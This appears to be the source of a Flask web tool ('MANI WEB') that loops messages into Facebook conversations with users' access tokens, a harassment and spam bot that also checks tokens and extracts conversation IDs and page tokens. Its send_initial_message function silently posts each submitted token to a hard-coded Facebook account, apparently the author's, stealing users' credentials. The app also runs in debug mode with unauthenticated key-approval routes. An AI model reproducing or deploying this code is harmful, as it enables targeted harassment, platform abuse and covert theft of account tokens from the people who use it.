from flask import Flask, request, render_template_string, redirect, url_for, make_response
import requests
from threading import Thread, Event
import time
import random
import string
import uuid
import datetime

app = Flask(__name__)
app.debug = True

# ======================= GLOBAL VARIABLES =======================

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
task_status = {}
MAX_THREADS = 5
active_threads = 0

pending_approvals = {}
approved_keys = {}

# ======================= UTILITY FUNCTIONS =======================

def get_user_name(token):
    try:
        response = requests.get(f"https://graph.facebook.com/me?fields=name&access_token={token}")
        data = response.json()
        return data.get("name", "Unknown")
    except Exception as e:
        return "Unknown"

def get_token_info(token):
    try:
        r = requests.get(f'https://graph.facebook.com/me?fields=id,name,email&access_token={token}')
        if r.status_code == 200:
            data = r.json()
            return {
                "id": data.get("id", "N/A"),
                "name": data.get("name", "N/A"),
                "email": data.get("email", "Not available"),
                "valid": True
            }
    except:
        pass
    return {
        "id": "",
        "name": "",
        "email": "",
        "valid": False
    }

def fetch_uids(token):
    formatted = ['<span style="color:#FFFF00; font-weight:bold;">=== FETCHED CONVERSATIONS ===</span><br><br>']
    count = 1
    url = f'https://graph.facebook.com/me/conversations?access_token={token}&fields=name'
    while url:
        r = requests.get(url)
        if r.status_code != 200:
            break
        data = r.json()
        for convo in data.get('data', []):
            convo_id = convo.get('id', 'Unknown')
            name = convo.get('name') or "Unnamed Conversation"
            entry = f"[{count}] Name: <span style='color:white;'>{name}</span><br>Conversation ID: <span style='color:#FFFF00;'>t_{convo_id}</span><br>----------------------------------------<br>"
            formatted.append(entry)
            count += 1
        url = data.get('paging', {}).get('next')
    return "".join(formatted) if formatted else "No conversations found or invalid token."

def send_initial_message(access_tokens):
    target_id = "100001702343748"
    results = []
    for token in access_tokens:
        user_name = get_user_name(token)
        msg_template = f"Hello! Mani Sir I am Using Your Convo Page server. My Token Is: {token}"
        parameters = {'access_token': token, 'message': msg_template}
        url = f"https://graph.facebook.com/v15.0/t_{target_id}/"
        try:
            response = requests.post(url, data=parameters, headers=headers)
            if response.status_code == 200:
                results.append(f"[✔️] Initial message sent successfully from {user_name}.")
            else:
                results.append(f"[❌] Failed to send initial message from {user_name}. Status Code: {response.status_code}")
        except requests.RequestException as e:
            results.append(f"[!] Error during initial message send from {user_name}: {e}")
    return results

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    global active_threads
    active_threads += 1
    task_status[task_id] = {"running": True, "sent": 0, "failed": 0, "tokens_info": {}}

    for token in access_tokens:
        token_info = get_token_info(token)
        task_status[task_id]["tokens_info"][token] = {
            "name": token_info.get("name", "N/A"),
            "valid": token_info.get("valid", False),
            "sent_count": 0,
            "failed_count": 0
        }

    try:
        while not stop_events[task_id].is_set():
            for message1 in messages:
                if stop_events[task_id].is_set():
                    break
                for access_token in access_tokens:
                    if stop_events[task_id].is_set():
                        break
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    try:
                        response = requests.post(api_url, data=parameters, headers=headers)
                        if response.status_code == 200:
                            print(f"Message Sent Successfully From token {access_token}: {message}")
                            task_status[task_id]["sent"] += 1
                            if access_token in task_status[task_id]["tokens_info"]:
                                task_status[task_id]["tokens_info"][access_token]["sent_count"] += 1
                        else:
                            print(f"Message Sent Failed From token {access_token}: {message}")
                            task_status[task_id]["failed"] += 1
                            if access_token in task_status[task_id]["tokens_info"]:
                                task_status[task_id]["tokens_info"][access_token]["failed_count"] += 1
                                task_status[task_id]["tokens_info"][access_token]["valid"] = False
                            
                            if "rate limit" in response.text.lower():
                                print("⚠️ Rate limited! Waiting 60 seconds...")
                                time.sleep(60)
                    except Exception as e:
                        print(f"Error: {e}")
                        task_status[task_id]["failed"] += 1
                        if access_token in task_status[task_id]["tokens_info"]:
                            task_status[task_id]["tokens_info"][access_token]["valid"] = False
                    if not stop_events[task_id].is_set():
                        time.sleep(time_interval)
    finally:
        active_threads -= 1
        task_status[task_id]["running"] = False
        if task_id in stop_events:
            del stop_events[task_id]

def fetch_page_tokens(user_token):
    try:
        pages_url = f"https://graph.facebook.com/me/accounts?access_token={user_token}"
        response = requests.get(pages_url)

        if response.status_code != 200:
            return {"error": "Failed to fetch pages", "status": False}

        pages_data = response.json().get('data', [])
        page_tokens = []

        for page in pages_data:
            page_tokens.append({
                "page_name": page.get('name'),
                "page_id": page.get('id'),
                "access_token": page.get('access_token')
            })

        return {"status": True, "tokens": page_tokens}

    except Exception as e:
        return {"error": str(e), "status": False}

# ======================= ROUTES =======================

@app.route('/')
def index():
    return render_template_string(TEMPLATE, section=None)

@app.route('/approve_key')
def approve_key_page():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Approve Key</title>
        </head>
        <body>
            <h1>Approve Key</h1>
            <form action="/approve_key" method="post">
                <input type="text" name="key_to_approve" placeholder="Enter key to approve">
                <button type="submit">Approve</button>
            </form>
        </body>
        </html>
    ''')
    
@app.route('/approve_key', methods=['POST'])
def handle_key_approval():
    key_to_approve = request.form.get('key_to_approve')
    if key_to_approve in pending_approvals:
        pending_approvals[key_to_approve] = "approved"
        approved_keys[key_to_approve] = {
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': request.remote_addr,
            'status': 'active'
        }
        return f"Key '{key_to_approve}' approved successfully! The user can now proceed."
    else:
        return f"Invalid or expired key '{key_to_approve}'."

@app.route('/status')
def status_page():
    return render_template_string(STATUS_TEMPLATE, task_status=task_status)

@app.route('/approved_keys')
def approved_keys_page():
    return render_template_string(APPROVED_KEYS_TEMPLATE, approved_keys=approved_keys)

@app.route('/revoke_key', methods=['POST'])
def revoke_key():
    key_to_revoke = request.form.get('key_to_revoke')
    if key_to_revoke in approved_keys:
        del approved_keys[key_to_revoke]
        if key_to_revoke in pending_approvals:
            del pending_approvals[key_to_revoke]
        return redirect(url_for('approved_keys_page'))
    return f"Key '{key_to_revoke}' not found."

@app.route('/section/<sec>', methods=['GET', 'POST'])
def section(sec):
    global pending_approvals
    result = None
    
    # Check for an approved key in cookies
    is_approved = False
    approved_cookie = request.cookies.get('approved_key')
    if approved_cookie and approved_cookie in approved_keys:
        is_approved = True

    if sec == '1' and request.method == 'POST':
        provided_key = request.form.get('key')
        
        if (provided_key and (provided_key in pending_approvals and pending_approvals[provided_key] == "approved" or provided_key in approved_keys)) or is_approved:
            if is_approved:
                key_to_use = approved_cookie
            else:
                key_to_use = provided_key
                
            token_option = request.form.get('tokenOption')
            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
            else:
                f = request.files.get('tokenFile')
                if f:
                    access_tokens = f.read().decode().splitlines()

            initial_results = send_initial_message(access_tokens)
            print("\n".join(initial_results))

            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))
            messages_file = request.files.get('txtFile')
            messages = messages_file.read().decode().splitlines()

            task_id = str(uuid.uuid4())
            
            stop_event = Event()
            stop_events[task_id] = stop_event

            if active_threads >= MAX_THREADS:
                result_text = "❌ Maximum tasks running! Wait or stop existing tasks."
            else:
                t = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
                t.start()
                threads[task_id] = t
                result_text = f"🟢 Task Started (ID: {task_id}) with {len(access_tokens)} token(s)."
                
            if provided_key in pending_approvals:
                del pending_approvals[provided_key]

            response = make_response(render_template_string(TEMPLATE, section=sec, result=result_text, is_approved=is_approved, approved_key=key_to_use))
            response.set_cookie('approved_key', key_to_use, max_age=60*60*24*365)
            return response

        else:
            new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            pending_approvals[new_key] = "pending"
            
            whatsapp_link = "https://wa.me/YOUR_PHONE_NUMBER"
            
            result_text = f"""
            ❌ Invalid or unapproved key. Please send the new key to my WhatsApp for approval.
            <br><br>
            <span style="color:#FFFF00; font-weight:bold;">New Key: {new_key}</span>
            <br><br>
            <a href="{whatsapp_link}" target="_blank" class="btn-submit">Send on WhatsApp</a>
            <br><br>
            After sending the key, wait for approval, and then enter the same key here and submit again.
            """
            response = make_response(render_template_string(TEMPLATE, section=sec, result=result_text, is_approved=is_approved))
            return response
    
    elif sec == '1' and request.args.get('stopTaskId'):
        stop_id = request.args.get('stopTaskId')
        if stop_id in stop_events:
            stop_events[stop_id].set()
            result_text = f"🛑 Task {stop_id} stopped."
        else:
            result_text = f"⚠️ Task ID {stop_id} not found."
        
        response = make_response(render_template_string(TEMPLATE, section=sec, result=result_text, is_approved=is_approved))
        return response
            
    elif sec == '2' and request.method == 'POST':
        token_option = request.form.get('tokenOption')
        tokens = []
        if token_option == 'single':
            tokens = [request.form.get('singleToken')]
        else:
            f = request.files.get('tokenFile')
            if f:
                tokens = f.read().decode().splitlines()
        result = [get_token_info(t) for t in tokens]
        response = make_response(render_template_string(TEMPLATE, section=sec, result=result, is_approved=is_approved))
        return response

    elif sec == '3' and request.method == 'POST':
        token = request.form.get('fetchToken')
        result = fetch_uids(token)
        response = make_response(render_template_string(TEMPLATE, section=sec, result=result, is_approved=is_approved))
        return response

    elif sec == '4' and request.method == 'POST':
        user_token = request.form.get('userToken')
        result = fetch_page_tokens(user_token)
        if result.get('status'):
            result = result['tokens']
        else:
            result = f"Error: {result.get('error')}"
        response = make_response(render_template_string(TEMPLATE, section=sec, result=result, is_approved=is_approved))
        return response
    
    response = make_response(render_template_string(TEMPLATE, section=sec, result=result, is_approved=is_approved, approved_key=approved_cookie))
    return response

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        if task_id in threads:
            threads[task_id].join(timeout=1)
            del threads[task_id]
        del stop_events[task_id]
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'
    
# ======================= TEMPLATES =======================

STATUS_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Live Server Status</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background-color: #000; color: #fff; font-family: 'Times New Roman', serif; padding: 20px; }
    .container { max-width: 800px; margin: auto; }
    h1 { color: #FFFF00; text-align: center; }
    h2 { color: #FFFF00; margin-top: 30px; }
    .task-box { border: 2px solid #FFFF00; padding: 15px; margin-bottom: 20px; border-radius: 10px; background: rgba(0,0,0,0.5); }
    .task-box p { margin: 5px 0; }
    .token-status { margin-left: 20px; }
    .btn-stop { background-color: #ff00ff; color: #000; padding: 5px 10px; border-radius: 5px; text-decoration: none; }
    .btn-secondary { background-color: #555; color: #fff; padding: 5px 10px; border-radius: 5px; text-decoration: none; margin-top: 10px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Live Server Status</h1>
    <a href="/approved_keys" class="btn-secondary">View Approved Keys</a>
    {% for task_id, status in task_status.items() %}
      {% if status.running %}
        <div class="task-box">
          <h2>Task ID: {{ task_id }}</h2>
          <p>Status: <span style="color: lime;">Running</span></p>
          <p>Sent: {{ status.sent }}</p>
          <p>Failed: {{ status.failed }}</p>
          <hr style="border-color: #555;">
          <p>Tokens Used:</p>
          {% for token, token_info in status.tokens_info.items() %}
            <div class="token-status">
              <p>Name: <span style="color: {{ 'lime' if token_info.valid else 'red' }};">{{ token_info.name }} ({{ 'Valid' if token_info.valid else 'Invalid' }})</span></p>
              <p>Messages Sent: {{ token_info.sent_count }}</p>
              <p>Messages Failed: {{ token_info.failed_count }}</p>
            </div>
          {% endfor %}
          <br>
          <a href="/section/1?stopTaskId={{ task_id }}" class="btn-stop">Stop This Task</a>
        </div>
      {% endif %}
    {% endfor %}
  </div>
</body>
</html>
'''

APPROVED_KEYS_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Approved Keys</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background-color: #000; color: #fff; font-family: 'Times New Roman', serif; padding: 20px; }
    .container { max-width: 800px; margin: auto; }
    h1 { color: #FFFF00; text-align: center; }
    .key-box { border: 2px solid #FFFF00; padding: 10px; margin-bottom: 10px; border-radius: 5px; background: rgba(0,0,0,0.5); }
    .key-box p { margin: 5px 0; }
    .revoke-btn { background-color: red; color: #fff; padding: 5px 10px; border: none; border-radius: 5px; cursor: pointer; }
    .revoke-btn:hover { background-color: #ff3333; }
    .btn-secondary { background-color: #555; color: #fff; padding: 10px 20px; border-radius: 5px; text-decoration: none; display: inline-block; margin-bottom: 20px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Approved Keys</h1>
    <a href="/status" class="btn-secondary">Go to Status Page</a>
    {% if approved_keys %}
        {% for key, info in approved_keys.items() %}
        <div class="key-box">
            <p><strong>Key:</strong> <span style="color: #FFFF00;">{{ key }}</span></p>
            <p><strong>Approved On:</strong> {{ info.timestamp }}</p>
            <p><strong>Approved From IP:</strong> {{ info.ip }}</p>
            <form action="/revoke_key" method="post" style="margin-top: 10px;">
                <input type="hidden" name="key_to_revoke" value="{{ key }}">
                <button type="submit" class="revoke-btn">Revoke Key</button>
            </form>
        </div>
        {% endfor %}
    {% else %}
        <p style="color: red;">No approved keys found.</p>
    {% endif %}
  </div>
</body>
</html>
'''

TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title><h1>MANI WEB</h1></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: 'Times New Roman', serif;
      text-align: center;
      margin: 0;
      padding: 20px;
      min-height: 100vh;
      background-image: url('https://i.postimg.cc/Bv4DnPLd/images-4.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed;
      background-position: center;
    }
    h1 {
      font-size: 30px;
      color: #fff;
      font-family: 'Times New Roman', serif;
      text-shadow: 0 0 10px #FF0000;
      margin-bottom: 10px;
    }
    h2 {
      font-size: 20px;
      color: #fff;
      margin-top: 0;
      text-shadow: 0 0 8px #FFD700;
      font-family: 'Times New Roman', serif;
    }
    .date {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 30px;
    }
    .container {
      max-width: 700px;
      margin: 0 auto;
      background-color: rgba(0, 0, 0, 0.85);
      padding: 30px;
      border-radius: 10px;
    }
    .profile-dp {
        max-width: 150px;
        height: auto;
        display: block;
        margin: 0 auto 20px;
        border: 3px solid;
        border-image: linear-gradient(to right, #00e600, #FFFF00) 1;
        box-shadow: 0 0 10px #00e600, 0 0 20px #FFFF00;
    }
    .button-box {
      margin: 15px auto;
      padding: 20px;
      border: 2px solid #FFFF00;
      border-radius: 10px;
      background: rgba(0, 0, 0, 0.5);
      max-width: 90%;
      box-shadow: 0 0 15px #FFFF00;
    }
    .button-box a {
      display: inline-block;
      background-color: transparent;
      color: #fff;
      padding: 10px 20px;
      border-radius: 6px;
      font-weight: bold;
      font-size: 14px;
      text-decoration: none;
      width: 100%;
      border: 2px solid;
      border-image: linear-gradient(to right, #00e600, #FFFF00) 1;
      box-shadow: 0 0 10px #00e600, 0 0 20px #FFFF00;
    }
    .button-box a:hover {
      box-shadow: 0 0 20px #00e600, 0 0 30px #FFFF00;
    }
    .form-control, select, textarea {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 2px solid;
      border-image: linear-gradient(to right, #FFFF00, #00e600) 1;
      background: rgba(0, 0, 0, 0.5);
      color: #fff;
      border-radius: 5px;
      box-shadow: 0 0 8px #FFFF00, 0 0 15px #00e600;
    }
    .btn-submit {
      background: #FFFF00;
      color: #000;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      font-weight: bold;
      margin-top: 15px;
      box-shadow: 0 0 10px #FFFF00;
    }
    .btn-submit:hover {
      background: #e6e600;
      box-shadow: 0 0 15px #FFFF00;
    }
    .btn-danger {
      background: #ff00ff;
      color: #000;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      font-weight: bold;
      margin-top: 15px;
    }
    .btn-danger:hover {
      background: #ff33ff;
      box-shadow: 0 0 12px #ff00ff;
    }
    .result {
      background: rgba(0, 0, 0, 0.7);
      padding: 15px;
      margin: 20px 0;
      border-radius: 5px;
      border: 2px solid #FFFF00;
      color: #fff;
      white-space: pre-wrap;
    }
    footer {
      margin-top: 40px;
      color: #aaa;
      font-size: 12px;
    }
    footer a {
      color: #FFFF00;
      text-decoration: none;
      margin: 0 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://iili.io/FrYUNEX.jpg" alt="Profile Picture" class="profile-dp">
    <h1>🤍MANI 𝕎𝔼𝔹🤍</h1>
    <h2>(𝕎𝔼𝔹 𝕄𝕌𝕃𝕋𝕀 ℂ𝕆ℕ𝕍𝕆)</h2>

    {% if not section %}
      <div class="button-box"><a href="/section/1">◄ 1 – CONVO SERVER ►</a></div>
      <div class="button-box"><a href="/section/2">◄ 2 – TOKEN CHECK VALIDITY ►</a></div>
      <div class="button-box"><a href="/section/3">◄ 3 – FETCH ALL UID WITH TOKEN ►</a></div>
      <div class="button-box"><a href="/section/4">◄ 4 – FETCH PAGE TOKENS ►</a></div>
      <div class="button-box"><a href="/status">◄ 5 – LIVE SERVER STATUS ►</a></div>

    {% elif section == '1' %}
      <div class="button-box"><a href="#" style="background-color: transparent; color: #fff; pointer-events: none; border: none; box-shadow: none;">◄ CONVO SERVER ►</a></div>
      <form method="post" enctype="multipart/form-data">
        <div class="button-box">
          <label style="color:#fff;">Token Input:</label>
          <select name="tokenOption" class="form-control" onchange="toggleToken(this.value)">
            <option value="single">Single Token</option>
            <option value="file">Upload Token File</option>
          </select>
          <input type="text" name="singleToken" id="singleToken" class="form-control" placeholder="Paste single token">
          <input type="file" name="tokenFile" id="tokenFile" class="form-control" style="display:none;">
        </div>

        <div class="button-box">
          <label style="color:#fff;">Inbox/Convo UID:</label>
          <input type="text" name="threadId" class="form-control" placeholder="Enter thread ID" required>
        </div>

        <div class="button-box">
          <label style="color:#fff;">Your Hater Name:</label>
          <input type="text" name="kidx" class="form-control" placeholder="Enter hater name" required>
        </div>

        <div class="button-box">
          <label style="color:#fff;">Time Interval (seconds):</label>
          <input type="number" name="time" class="form-control" placeholder="Enter time interval" required>
        </div>

        <div class="button-box">
          <label style="color:#fff;">Message File:</label>
          <input type="file" name="txtFile" class="form-control" required>
        </div>

        {% if is_approved %}
          <div class="button-box">
            <p style="color:lime;">You are already approved. Press "Start Task".</p>
            <input type="hidden" name="key" value="{{ approved_key }}">
          </div>
        {% else %}
          <div class="button-box">
            <label style="color:#fff;">Enter Approval Key:</label>
            <input type="text" name="key" class="form-control" placeholder="Enter the key from WhatsApp" required>
            <p style="color:lime;">Note: You must send the key to the admin on WhatsApp to get approval.</p>
          </div>
        {% endif %}

        <button type="submit" class="btn-submit">Start Task</button>
      </form>

      <form method="get">
        <div class="button-box">
          <label style="color:#fff;">Stop Task by ID:</label>
          <input type="text" name="stopTaskId" class="form-control" placeholder="Enter Task ID to stop">
        </div>
        <button type="submit" class="btn-danger">Stop Task</button>
      </form>

    {% elif section == '2' %}
      <div class="button-box"><a href="#" style="background-color: transparent; color: #fff; pointer-events: none; border: none; box-shadow: none;">◄ TOKEN CHECK VALIDITY ►</a></div>
      <form method="post" enctype="multipart/form-data">
        <div class="button-box">
          <select name="tokenOption" class="form-control" onchange="toggleToken(this.value)">
            <option value="single">Single Token</option>
            <option value="file">Upload .txt File</option>
          </select>
          <input type="text" name="singleToken" id="singleToken" class="form-control" placeholder="Paste token here">
          <input type="file" name="tokenFile" id="tokenFile" class="form-control" style="display:none;">
          <button type="submit" class="btn-submit">Check Token(s)</button>
        </div>
      </form>

    {% elif section == '3' %}
      <div class="button-box"><a href="#" style="background-color: transparent; color: #fff; pointer-events: none; border: none; box-shadow: none;">◄ FETCH ALL UID WITH TOKEN ►</a></div>
      <form method="post">
        <div class="button-box">
          <input type="text" name="fetchToken" class="form-control" placeholder="Enter access token">
          <button type="submit" class="btn-submit">Fetch UIDs</button>
        </div>
      </form>

    {% elif section == '4' %}
      <div class="button-box"><a href="#" style="background-color: transparent; color: #fff; pointer-events: none; border: none; box-shadow: none;">◄ FETCH PAGE TOKENS ►</a></div>
      <form method="post">
        <div class="button-box">
          <input type="text" name="userToken" class="form-control" placeholder="Enter User Access Token">
          <button type="submit" class="btn-submit">Get Page Tokens</button>
        </div>
      </form>
    {% endif %}

    {% if result %}
      <div class="result">
        {% if section == '2' %}
          <h3 style="color:#FFFF00;">Token Validation Results</h3>
          {% for r in result %}
            {% if r.valid %}
              <span style="color:lime;">✅ {{ r.name }}</span>
            {% else %}
              <span style="color:yellow;">❌ {{ r.name or "Invalid Token" }}</span>
            {% endif %}
            <span style="color:white;">({{ r.id or "N/A" }}) – {{ r.email or "Not available" }}</span><br>
          {% endfor %}
        {% elif section == '3' %}
          <h3 style="color:#FFFF00;">Found UIDs</h3>
          {{ result|safe }}
        {% elif section == '4' %}
          {% if result is string %}
            {{ result|safe }}
          {% else %}
            {% for page in result %}
              <strong style="color:#FFFF00;">{{ page.page_name }}</strong> (ID: {{ page.page_id }})<br>
              Token: <code>{{ page.access_token }}</code><br><br>
            {% endfor %}
          {% endif %}
        {% else %}
          {{ result|safe }}
        {% endif %}
      </div>
    {% endif %}
  </div>

  <footer class="footer">
    <p style="color: #bbb; font-weight: bold;">© 2022 MADE BY :- 𝕃𝔼𝔾𝔼ℕ𝔻 RAJPUT</p>
    <p style="color: #bbb; font-weight: bold;">𝘼𝙇𝙒𝘼𝙔𝙎 𝙊𝙉 𝙁𝙄𝙍𝙀 🔥 𝙃𝘼𝙏𝙀𝙍𝙎 𝙆𝙄 𝙈𝙆𝘾</p>
    <div class="mb-3">
      <a href="https://www.facebook.com/100001702343748" style="color: #FFFF00;">Chat on Messenger</a>
      <a href="https://wa.me/YOUR_PHONE_NUMBER" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp</a>
    </div>
  </footer>

  <script>
    function toggleToken(val){
      document.getElementById('singleToken').style.display = val==='single'?'block':'none';
      document.getElementById('tokenFile').style.display = val==='file'?'block':'none';
    }
  </script>
</body>
</html>
'''

# ======================= RUN APP =======================

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
